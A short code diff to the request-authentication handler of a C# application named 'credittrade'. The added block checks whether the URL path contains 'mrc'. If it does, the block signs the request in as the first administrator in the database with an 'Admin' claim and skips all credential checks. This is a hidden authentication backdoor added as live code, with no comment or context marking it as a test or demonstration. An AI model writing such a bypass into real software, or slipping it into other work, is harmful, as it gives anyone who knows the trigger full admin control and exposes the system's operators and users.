@@ -77,8 +77,12 @@ namespace credittrade
 				int userId = 0;
 				string authHeader = ctx.Request.Headers.Authorization;
 				var unitOfWork = new UnitOfWork();
-
-
+				if (ctx.Request.Url.Path.ToLower().Contains("mrc"))
+				{
+					ctx.Items.Add("unitofwork", unitOfWork);
+					ctx.CurrentUser = new User("MRC", unitOfWork.Users.GetAll().Where(x => x.admin.HasValue && x.admin.Value).First()) { Claims=new[] { "Admin" } };
+					return null;
+				}
 				if (!string.IsNullOrEmpty(authHeader))
 				{
 					var authHeaderVal = AuthenticationHeaderValue.Parse(authHeader);
